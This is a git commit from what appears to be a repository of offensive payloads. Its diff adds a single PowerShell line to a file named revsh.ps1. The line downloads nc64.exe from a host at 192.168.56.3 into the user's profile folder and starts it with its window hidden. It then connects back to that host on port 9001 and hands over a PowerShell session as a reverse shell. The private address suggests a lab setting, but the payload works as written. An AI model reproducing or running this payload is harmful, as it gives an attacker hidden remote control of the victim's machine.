a23d620aaa0b833827103f417b67866d550a11a6
Pinokkio <112076418+miljonka@users.noreply.github.com>
2023-11-01 13:12:41 +0200

    Update revsh.ps1

--- payloads/reverse shell/revsh.ps1
+++ payloads/reverse shell/revsh.ps1
@@ -1,1 +1,1 @@
-
+(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/nc64.exe', "$env:USERPROFILE\nc64.exe"); Start-Process "$env:USERPROFILE\nc64.exe" -ArgumentList @('192.168.56.3', '9001', '-e', 'powershell') -WindowStyle Hidden
